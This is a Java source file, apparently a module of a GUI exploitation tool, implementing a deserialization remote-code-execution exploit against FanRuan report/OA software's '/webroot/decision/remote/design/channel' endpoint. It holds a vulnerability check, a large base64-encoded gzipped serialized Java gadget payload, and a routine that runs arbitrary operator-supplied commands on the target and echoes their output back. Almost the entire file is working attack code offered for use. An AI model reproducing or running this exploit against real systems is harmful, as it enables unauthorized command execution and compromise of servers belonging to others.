package exp.oa.fanruanoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Methods;
import utils.Response;

import java.util.HashMap;

public class fanruan_channel_SerialRCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }


    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.get(url+"/webroot/decision/remote/design/channel",head,"utf-8");


            if (get_res.getCode() == 200 && get_res.getText().contains("supported")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ fanruan_channel_SerialRCE ]");
                    textArea.appendText("\n TomcatEcho构造回显");
                    textArea.appendText("\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n fanruan_channel_SerialRCE-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        String s = "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";
        try {
            String cmd_echo = Methods.Tomcatecho(url + "/webroot/decision/remote/design/channel",cmd,s);

            if (cmd_echo != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+cmd_echo);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n fanruan_channel_SerialRCE-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

}

